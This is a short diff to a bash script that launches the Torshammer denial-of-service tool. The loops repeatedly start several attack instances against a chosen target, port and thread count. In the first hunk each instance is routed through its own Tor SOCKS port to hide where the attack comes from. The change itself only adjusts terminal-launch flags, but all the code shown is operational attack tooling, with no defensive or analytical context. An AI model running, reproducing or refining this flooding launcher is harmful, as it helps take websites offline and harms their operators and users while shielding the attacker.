@@ -75,7 +75,7 @@ while true; do
   while [ $ii -le $inst ]; do
 porttor=$((9050+$ii))
 #printf "\e[1;92m[*] Attack through Tor Port: %s\e[0m\n" $porttor
-gnome-terminal -q --tab -- torsocks -P $porttor python torshammer/torshammer.py -t $target -p $portt -r $threads
+gnome-terminal -- torsocks -P $porttor python torshammer/torshammer.py -t $target -p $portt -r $threads
 ii=$((ii+1))
 done
 sleep 120
@@ -96,7 +96,7 @@ while true; do
   let i=1
   while [[ $i -le $inst ]]; do
 
-gnome-terminal --tab -- python torshammer/torshammer.py -t $target -p $portt -r $threads
+gnome-terminal -- python torshammer/torshammer.py -t $target -p $portt -r $threads
 i=$((i+1))
 done
 sleep 120
